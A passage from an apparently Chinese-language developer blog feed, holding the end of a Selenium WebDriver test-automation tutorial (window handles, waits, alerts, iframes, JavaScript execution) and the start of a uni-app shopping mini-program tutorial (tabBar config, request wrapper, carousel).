class="hljs-comment">//检查元素是否显示</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.print(webElement2.is<span class="hljs-constructor">Displayed()</span>);<br></code></pre></td></tr></table></figure><p>这里面driver的操作还有</p><p>close(),</p><p>quit()【一般放程序结束的地方】</p><p>获取句柄（句柄（Handle）是一个是用来标识对象或者项目的<em><strong>标识符</strong></em>，可以用来<em>描述窗体、文件</em>等）</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">open</span><span class="hljs-constructor">Chrome()</span>;<br><span class="hljs-comment">//定位到百度输入框并输入数据</span><br>chromeDriver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">id</span>(<span class="hljs-string">&quot;kw&quot;</span>)</span>).send<span class="hljs-constructor">Keys(<span class="hljs-string">&quot;腾讯课堂&quot;</span>)</span>;<br><span class="hljs-comment">//定位到点击一下按钮</span><br>chromeDriver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">id</span>(<span class="hljs-string">&quot;su&quot;</span>)</span>).click<span class="hljs-literal">()</span>;<br><span class="hljs-comment">//获取当前句柄</span><br>chromeDriver.get<span class="hljs-constructor">WindowHandle()</span>;<br><span class="hljs-comment">//获取全部句柄</span><br>chromeDriver.get<span class="hljs-constructor">WindowHandles()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>sleep(<span class="hljs-number">3000</span>);<br><span class="hljs-comment">//跳转页面</span><br>chromeDriver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">name</span>(<span class="hljs-string">&quot;label&quot;</span>)</span>).click<span class="hljs-literal">()</span>;<br><span class="hljs-comment">//对比全部句柄</span><br>chromeDriver.get<span class="hljs-constructor">WindowHandles()</span>;<br></code></pre></td></tr></table></figure><p>还可以获取浏览器操作，使用manage，得到options对象</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">Options</span> <span class="hljs-keyword">option</span> = chromeDriver.manage();<br><span class="hljs-keyword">option</span>.xxx<br></code></pre></td></tr></table></figure><p>其中有很多方法给我们使用，比如window进行页面参数的获取</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Options</span> <span class="hljs-keyword">option</span> = chromeDriver.manage();<br>//获取当前页面大小<br><span class="hljs-keyword">System</span>.<span class="hljs-keyword">out</span>.print(<span class="hljs-keyword">option</span>.<span class="hljs-keyword">window</span>().getSize());<br></code></pre></td></tr></table></figure><p>然后是我们操作浏览器路由的navigate</p><p><img src="https://img-blog.csdnimg.cn/382b2f29268a488886b90e49f6aeca74.png" alt="navigate对象"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">//获取navigate对象<br>Navigation navigate = chromeDriver.navigate()<span class="hljs-comment">;</span><br>navigate.to(<span class="hljs-string">&quot;https://www.jd.com&quot;</span>)<span class="hljs-comment">;</span><br>navigate.refresh()<span class="hljs-comment">;</span><br>navigate.back()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="5-三大等待"><a href="#5-三大等待" class="headerlink" title="5.三大等待"></a>5.三大等待</h2><h3 id="5-1硬性等待"><a href="#5-1硬性等待" class="headerlink" title="5.1硬性等待"></a>5.1硬性等待</h3><p>使用线程Thread.sleep()</p><p>需要抛出错误，实现等待</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-keyword">try</span> &#123;<br>driver.get(<span class="hljs-string">&quot;https://music.91q.com/&quot;</span>);<br>driver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">linkText</span>(<span class="hljs-string">&quot;歌单&quot;</span>)</span>).click<span class="hljs-literal">()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>sleep(<span class="hljs-number">1000</span>);<br>driver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">xpath</span>(<span class="hljs-string">&quot;//span[@title=\&quot;电子\&quot;]&quot;</span>)</span>).click<span class="hljs-literal">()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>sleep(<span class="hljs-number">1000</span>);<br>driver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">xpath</span>(<span class="hljs-string">&quot;//img[@src=\&quot;https://img01.dmhmusic.com/0105/M00/E9/A4/ChR45GKy4m2AGwKiAAuLrKC1ZgU349.jpg@w_300,h_300\&quot;]&quot;</span>)</span>).click<span class="hljs-literal">()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>sleep(<span class="hljs-number">1000</span>);<br>&#125;catch(Exception e)&#123;<br>e.print<span class="hljs-constructor">StackTrace()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-2隐式等待"><a href="#5-2隐式等待" class="headerlink" title="5.2隐式等待"></a>5.2隐式等待</h3><p>隐式等待使用的是全局配置，设置之后只要后面需要寻找元素就会触发</p><p>他在driver的manage方法下，第一个参数是num数字，第二个类型是时间单位</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-comment">//实现隐式等待 等待五秒</span><br><span class="hljs-selector-tag">chromeDriver</span><span class="hljs-selector-class">.manage</span>()<span class="hljs-selector-class">.timeouts</span>()<span class="hljs-selector-class">.implicitlyWait</span>(<span class="hljs-number">5</span>, TimeUnit.SECONDS);<br></code></pre></td></tr></table></figure><h3 id="5-3显示等待"><a href="#5-3显示等待" class="headerlink" title="5.3显示等待"></a>5.3显示等待</h3><p>等待某个元素显示之后在执行操作</p><p><img src="https://img-blog.csdnimg.cn/a443fa4245484255ac588f4c5721a057.png" alt="显示等待"></p><p>我们需要新构造一个WebDriverWait对象并传入driver和时间参数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//显示等待</span><br>WebDriverWait wait = <span class="hljs-keyword">new</span> <span class="hljs-constructor">WebDriverWait(<span class="hljs-params">chromeDriver</span>,5)</span>;<br>WebElement element = wait.until(<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ExpectedConditions</span>.</span></span>visibility<span class="hljs-constructor">OfElementLocated(By.<span class="hljs-params">xpath</span>(<span class="hljs-string">&quot;//a[text()=&#x27;_专业在线教育平台(ke.qq.com)&#x27;]&quot;</span>)</span>));<br></code></pre></td></tr></table></figure><h2 id="6-特殊元素定位"><a href="#6-特殊元素定位" class="headerlink" title="6.特殊元素定位"></a>6.特殊元素定位</h2><h3 id="6-1-alert弹窗"><a href="#6-1-alert弹窗" class="headerlink" title="6.1 alert弹窗"></a>6.1 alert弹窗</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>定位弹窗<br>Alert alert =  chromeDriver.switchTo().alert();<br><span class="hljs-regexp">//</span>对弹窗进行操作<br><span class="hljs-regexp">//</span>同意操作<br>alert.accept();<br><span class="hljs-regexp">//</span>取消操作<br>alert.dismiss();<br></code></pre></td></tr></table></figure><h3 id="6-2-confirm弹窗"><a href="#6-2-confirm弹窗" class="headerlink" title="6.2 confirm弹窗"></a>6.2 confirm弹窗</h3><p>confirm弹窗和alert一样，也是使用switchTo().alert()定位得到，然后使用accept和dismiss进行操作</p><p>我们还可以进行<code>alert.getText()</code>进行获取弹窗中的文本信息</p><h3 id="6-3-iframe定位"><a href="#6-3-iframe定位" class="headerlink" title="6.3 iframe定位"></a>6.3 iframe定位</h3><p>iframe是一种特殊的能够嵌套html文件的标签</p><p><code> &lt;iframe src=&quot;demo_iframe_sandbox.htm&quot;&gt;&lt;/iframe&gt;</code></p><p>我们在进入第一层html之后需要定位其他的html就需要进行如下操作</p><p><img src="https://img-blog.csdnimg.cn/d5ebfe5d8de14abe808e64f8b7246611.png" alt="iframe"></p><h3 id="6-4-窗口定位"><a href="#6-4-窗口定位" class="headerlink" title="6.4 窗口定位"></a>6.4 窗口定位</h3><p>窗口定位有两种方式，第一种是使用页面的名字进行定位，第二种是使用句柄进行定位，但是句柄定位就需要用到增强for循环</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//window定位</span><br>chromeDriver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">id</span>(<span class="hljs-string">&quot;kw&quot;</span>)</span>).send<span class="hljs-constructor">Keys(<span class="hljs-string">&quot;腾讯课堂&quot;</span>)</span>;<br>chromeDriver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">id</span>(<span class="hljs-string">&quot;su&quot;</span>)</span>).click<span class="hljs-literal">()</span>;<br><span class="hljs-comment">//第一个页面的handle</span><br>String handle1 = chromeDriver.get<span class="hljs-constructor">WindowHandle()</span>;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">System</span>.</span></span>out.println(handle1);<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Thread</span>.</span></span>sleep(<span class="hljs-number">3000</span>);<br>chromeDriver.find<span class="hljs-constructor">Element(By.<span class="hljs-params">xpath</span>(<span class="hljs-string">&quot;//span[@name=&#x27;label&#x27;]&quot;</span>)</span>).click<span class="hljs-literal">()</span>;<br><span class="hljs-comment">//第二个页面的handle</span><br>Set&lt;String&gt; handle2 = chromeDriver.get<span class="hljs-constructor">WindowHandles()</span>;<br><span class="hljs-comment">//切换窗口</span><br><span class="hljs-comment">//根据name切换</span><br><span class="hljs-comment">//chromeDriver.switchTo().window(&quot;腾讯课堂_百度搜索&quot;);</span><br><span class="hljs-comment">//根据handle切换</span><br><span class="hljs-keyword">for</span>(String handle : handle2) &#123;<br>chromeDriver.switch<span class="hljs-constructor">To()</span>.window(handle);<br><span class="hljs-keyword">if</span>(chromeDriver.get<span class="hljs-constructor">Title()</span>.equals(<span class="hljs-string">&quot;腾讯课堂_百度搜索&quot;</span>)) &#123;<br>break;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-5-select下拉框"><a href="#6-5-select下拉框" class="headerlink" title="6.5 select下拉框"></a>6.5 select下拉框</h3><p><img src="https://img-blog.csdnimg.cn/467a4377634245d099282b6e125d1247.png" alt="select下拉框"></p><h3 id="6-6-时间日期控件——js-脚本控制"><a href="#6-6-时间日期控件——js-脚本控制" class="headerlink" title="6.6 时间日期控件——js 脚本控制"></a>6.6 时间日期控件——js 脚本控制</h3><p>如果控件没有限制手动输入，我们可以使用sendKeys的方法进行输入</p><p>如果不能手动输入</p><p>我们还可以在java中执行js代码</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">//利用js处理一部分元素</span><br>JavascriptExecutor jsExecutor = <span class="hljs-comment">(JavascriptExecutor)</span> chromeDriver;<br>jsExecutor.executeScript<span class="hljs-comment">(&quot;document.getElementById(&#x27;train_date&#x27;)</span>.setArribute<span class="hljs-comment">(&#x27;readOnly&#x27;,true)</span><span class="hljs-string">&quot;);</span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure><h3 id="6-7-文件上传"><a href="#6-7-文件上传" class="headerlink" title="6.7 文件上传"></a>6.7 文件上传</h3><p><img src="https://img-blog.csdnimg.cn/39a4b1d8c6d146fcbedbb2fdd0956eef.png" alt="文件上传"></p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>uni-shop</title>
    <link href="/2022/10/12/uni-shop/"/>
    <url>/2022/10/12/uni-shop/</url>
    
    <content type="html"><![CDATA[<h1 id="uni-shop"><a href="#uni-shop" class="headerlink" title="uni-shop"></a>uni-shop</h1><p>一个小程序购物平台</p><h2 id="1-tabBar"><a href="#1-tabBar" class="headerlink" title="1.tabBar"></a>1.tabBar</h2><p>下方导航栏的样式如图：</p><p><img src="https://img-blog.csdnimg.cn/be0d831b1a3d4db6859d282f8c6b5739.png" alt="tabBar"></p><p>要设置tabBar的样式，需要在pages.json中使用”tabBar”属性书写</p><p>主要是list显示导航栏的列表</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-string">&quot;tabBar&quot;</span>: &#123;<br><span class="hljs-regexp">//</span>选中文字颜色<br><span class="hljs-string">&quot;selectedColor&quot;</span>: <span class="hljs-string">&quot;#b50e03&quot;</span>,<br><span class="hljs-regexp">//</span>未选中时文字的颜色<br><span class="hljs-string">&quot;color&quot;</span>:<span class="hljs-string">&quot;#ccc&quot;</span>,<br><span class="hljs-regexp">//</span>导航栏配置信息<br><span class="hljs-string">&quot;list&quot;</span>: [<br>&#123;<br><span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;首页&quot;</span>,<br><span class="hljs-string">&quot;pagePath&quot;</span>: <span class="hljs-string">&quot;pages/index/index&quot;</span>,<br><span class="hljs-regexp">//</span>图标<br><span class="hljs-string">&quot;iconPath&quot;</span>: <span class="hljs-string">&quot;./static/icon/home.png&quot;</span>,<br><span class="hljs-regexp">//</span>选中时候的图标<br><span class="hljs-string">&quot;selectedIconPath&quot;</span>: <span class="hljs-string">&quot;./static/icon/home-active.png&quot;</span><br>&#125;,<br>&#123;<br><span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;资讯&quot;</span>,<br><span class="hljs-string">&quot;pagePath&quot;</span>: <span class="hljs-string">&quot;pages/news/news&quot;</span>,<br><span class="hljs-string">&quot;iconPath&quot;</span>: <span class="hljs-string">&quot;./static/icon/news.png&quot;</span>,<br><span class="hljs-string">&quot;selectedIconPath&quot;</span>: <span class="hljs-string">&quot;./static/icon/news-active.png&quot;</span><br>&#125;,<br>&#123;<br><span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;购物车&quot;</span>,<br><span class="hljs-string">&quot;pagePath&quot;</span>: <span class="hljs-string">&quot;pages/cart/cart&quot;</span>,<br><span class="hljs-string">&quot;iconPath&quot;</span>: <span class="hljs-string">&quot;./static/icon/cart.png&quot;</span>,<br><span class="hljs-string">&quot;selectedIconPath&quot;</span>: <span class="hljs-string">&quot;./static/icon/cart-active.png&quot;</span><br>&#125;,<br>&#123;<br><span class="hljs-string">&quot;text&quot;</span>: <span class="hljs-string">&quot;会员&quot;</span>,<br><span class="hljs-string">&quot;pagePath&quot;</span>: <span class="hljs-string">&quot;pages/member/member&quot;</span>,<br><span class="hljs-string">&quot;iconPath&quot;</span>: <span class="hljs-string">&quot;./static/icon/member.png&quot;</span>,<br><span class="hljs-string">&quot;selectedIconPath&quot;</span>: <span class="hljs-string">&quot;./static/icon/member-active.png&quot;</span><br>&#125;<br>]<br>&#125;,<br></code></pre></td></tr></table></figure><h2 id="2-首页"><a href="#2-首页" class="headerlink" title="2.首页"></a>2.首页</h2><p>对于node搭建的后台使用<code>node +文件名.js</code>的方式运行</p><p>首先要打开phpstudy提供一个本地服务器环境</p><p>如果phpstudy的数据库爆红，有可能是端口占用的情况，包括本机mysql正在运行在3306端口上</p><p>如果端口没有占用还是爆红，可能是没有打开mysql服务，在电脑的service中寻找mysql然后点击运行</p><h3 id="1-获取轮播图"><a href="#1-获取轮播图" class="headerlink" title="1.获取轮播图"></a>1.获取轮播图</h3><p>我使用node搭建的后台，然后发送请求获取数据</p><p>发送请求我们已经很熟悉了，使用uni.request</p><p>这里success中的this.swipers中的this指向需要依靠箭头函数实现，不然就要使用保存this的方法</p><p>uni.showToast是一个常用的提示框，类似于alert</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getSwipers</span><span class="hljs-params">()</span></span>&#123;<br>uni<span class="hljs-selector-class">.request</span>(&#123;<br>url: <span class="hljs-string">&quot;http://localhost:8082/api/getlunbo&quot;</span>,<br><span class="hljs-comment">//成功的回调</span><br>success: res =&gt; &#123;<br><span class="hljs-keyword">if</span>(res<span class="hljs-selector-class">.data</span><span class="hljs-selector-class">.status</span> !== <span class="hljs-number">0</span>)&#123;<br><span class="hljs-comment">//状态码错误 获取数据失败</span><br>return uni<span class="hljs-selector-class">.showToast</span>(&#123;<br>title: <span class="hljs-string">&quot;获取数据失败&quot;</span><br>&#125;)<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>this.swipers= res<span class="hljs-selector-class">.data</span><span class="hljs-selector-class">.message</span><br>&#125;<br>&#125;<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后在OnLoad的钩子上调用这个函数就可以实现获取每次加载发送请求</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">onLoad</span><span class="hljs-params">()</span></span> &#123;<br>this<span class="hljs-selector-class">.getSwipers</span>()<br>&#125;,<br></code></pre></td></tr></table></figure><p>但是我们现在要做的是对请求的封装</p><p>新建目录<code>util</code>，然后创建<code>api.js</code></p><p>里面实现对promise的封装：</p><p>这样所有的请求都可以使用myRequest封装好的promise，减少代码的重复度，解耦</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><br><span class="hljs-comment">//设置基础地址</span><br><span class="hljs-keyword">const</span> BASE_URL = <span class="hljs-string">&quot;http://localhost:8082&quot;</span>;<br><span class="hljs-comment">//暴露封装好的myRequest</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> myRequest = <span class="hljs-function">(<span class="hljs-params">options</span>) =&gt;</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve,reject</span>)=&gt;</span>&#123;<br>uni.request(&#123;<br><span class="hljs-attr">url</span>: BASE_URL+options.url,<br><span class="hljs-attr">method</span>: options.method || <span class="hljs-string">&quot;GET&quot;</span>,<br><span class="hljs-attr">data</span>: options.data || &#123;&#125;,<br><span class="hljs-comment">//成功的回调</span><br><span class="hljs-attr">success</span>: <span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> &#123;<br><span class="hljs-keyword">if</span>(res.data.status !== <span class="hljs-number">0</span>)&#123;<br><span class="hljs-comment">//状态码错误 获取数据失败</span><br><span class="hljs-keyword">return</span> uni.showToast(&#123;<br><span class="hljs-attr">title</span>: <span class="hljs-string">&quot;获取数据失败&quot;</span><br>&#125;)<br>&#125;<br>resolve(res)<br>&#125;,<br><span class="hljs-attr">fail</span>: <span class="hljs-function"><span class="hljs-params">err</span> =&gt;</span> &#123;<br>uni.showToast(&#123;<br><span class="hljs-attr">title</span>: <span class="hljs-string">&quot;获取数据失败&quot;</span><br>&#125;)<br><span class="hljs-comment">//提示数据获取失败并调用reject</span><br>reject(err)<br>&#125;<br>&#125;)<br>&#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>然后把这个挂载到全局——<code>main.js</code>中</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>引入myRequest<br>import &#123; myRequest &#125; from <span class="hljs-string">&quot;util/api.js&quot;</span><br><span class="hljs-regexp">//</span>全局挂载到原型上<br>Vue.prototype.<span class="hljs-variable">$myreq</span> = myRequest<br></code></pre></td></tr></table></figure><p>这样Vue的原型上就多了一个<code>$myreq</code></p><p>我们发送请求的时候直接调用这个函数然后传入options对象就可以了</p><p>因为获取的是一个promise对象，所以我们需要使用async包裹一下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-title">getSwipers</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-comment">//封装好之后调用获取 res</span><br><span class="hljs-keyword">const</span> res = <span class="hljs-keyword">await</span> <span class="hljs-built_in">this</span>.$myreq(&#123;<br><span class="hljs-attr">url</span>: <span class="hljs-string">&quot;/api/getlunbo&quot;</span>,<br>&#125;)<br><span class="hljs-built_in">this</span>.swipers =  res.data.message<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-实现轮播图"><a href="#2-实现轮播图" class="headerlink" title="2.实现轮播图"></a>2.实现轮播图</h3><p>使用uni自带的swiper组件实现轮播</p><p>使用v-for进行循环生成item</p><p>然后动态绑定<code>img</code>属性</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- 轮播图组件 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">swiper</span> <span class="hljs-attr">indicator-dots</span> <span class="hljs-attr">circular</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 每一个的轮播item --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">swiper-item</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;item in swipers&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;item.id&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 轮播的内容 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span> <span class="hljs-attr">:src</span>=<span class="hljs-string">&quot;item.img&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">swiper-item</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">swiper</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-首页导航栏"><a href="#3-首页导航栏" class="headerlink" title="3.首页导航栏"></a>3.首页导航栏</h3><p>首先引入字体和图标以及相关样式，引用在app.vue中</p><p>这种字体图标的使用是在class中写 <code>iconfont +name</code></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=&quot;nav&quot;&gt;<br>&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=&quot;nav_item&quot;&gt;<br>&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=&quot;iconfont icon-ziyuan&quot;&gt;&lt;/<span class="hljs-keyword">view</span>&gt;<br>&lt;<span class="hljs-type">text</span>&gt;超市&lt;/<span class="hljs-type">text</span>&gt;<br>&lt;/<span class="hljs-keyword">view</span>&gt;<br>&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=&quot;nav_item&quot;&gt;<br>&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=&quot;iconfont icon-guanyuwomen&quot;&gt;&lt;/<span class="hljs-keyword">view</span>&gt;<br>&lt;<span class="hljs-type">text</span>&gt;联系我们&lt;/<span class="hljs-type">text</span>&gt;<br>&lt;/<span class="hljs-keyword">view</span>&gt;<br>&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=&quot;nav_item&quot;&gt;<br>&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=&quot;iconfont icon-tupian&quot;&gt;&lt;/<span class="hljs-keyword">view</span>&gt;<br>&lt;<span class="hljs-type">text</span>&gt;社区图片&lt;/<span class="hljs-type">text</span>&gt;<br>&lt;/<span class="hljs-keyword">view</span>&gt;<br>&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=&quot;nav_item&quot;&gt;<br>&lt;<span class="hljs-keyword">view</span> <span class="hljs-keyword">class</span>=&quot;iconfont icon-shipin&quot;&gt;&lt;/<span class="hljs-keyword">view</span>&gt;<br>&lt;<span class="hljs-type">text</span>&gt;学习视频&lt;/<span class="hljs-type">text</span>&gt;<br>&lt;/<span class="hljs-keyword">view</span>&gt;<br>&lt;/<span class="hljs-keyword">view</span>&gt;<br></code></pre></td></tr></table></figure><p>我们样式使用<code>flex</code>布局，弹性布局将盒子转换为弹性盒子</p><p><code>line-height</code>拉高我们的每一行高度，让字体图标下移</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-comment">// 导航栏</span><br><span class="hljs-selector-class">.nav</span>&#123;<br><span class="hljs-attribute">display</span>: flex;<br><span class="hljs-selector-class">.nav_item</span>&#123;<br><span class="hljs-attribute">width</span>: <span class="hljs-number">25%</span>;<br><span class="hljs-attribute">text-align</span>: center;<br>view&#123;<br><span class="hljs-attribute">width</span>: <span class="hljs-number">120</span>rpx;<br><span class="hljs-attribute">height</span>: <span class="hljs-number">120</span>rpx;<br><span class="hljs-attribute">border-radius</span>: <span class="hljs-number">60</span>rpx;<br><span class="hljs-attribute">line-height</span>: <span class="hljs-number">120</span>rpx;<br><span class="hljs-attribute">margin</span>: <span 